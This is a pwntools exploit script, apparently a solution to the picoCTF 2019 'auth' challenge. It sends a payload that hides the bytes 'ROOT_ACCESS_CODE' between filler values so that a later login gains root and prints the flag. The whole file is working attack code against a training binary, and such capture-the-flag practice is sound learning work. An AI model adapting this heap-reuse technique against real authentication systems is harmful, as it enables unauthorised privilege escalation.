from pwn import *
import binascii
import sys

# python main.py  DEBUG


BINARY = './auth'
context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']


def P32(v):
    return struct.pack('I', v)


def P64(v):
    return struct.pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


if args["REMOTE"]:
    sh = remote('2019shell1.picoctf.com', 49920)
else:
    sh = process(BINARY, stdout=process.PTY, stdin=process.PTY)





payload = ''
payload += P64(0xdeadbeefdeadbeef)
payload += deHex('4343415f544f4f52')
payload += deHex('45444f435f535345')
payload += P64(0xdeadbeefdeadbeef)


sh.sendlineafter('>', 'login')
sh.sendlineafter('\n', '32')
sh.sendlineafter('\n', payload)
sh.sendlineafter('\n', 'logout')


sh.sendlineafter('\n', 'login')
sh.sendlineafter('\n', '16')
sh.sendlineafter('\n', 'fk')
sh.sendlineafter('\n', 'print-flag')


sh.interactive()
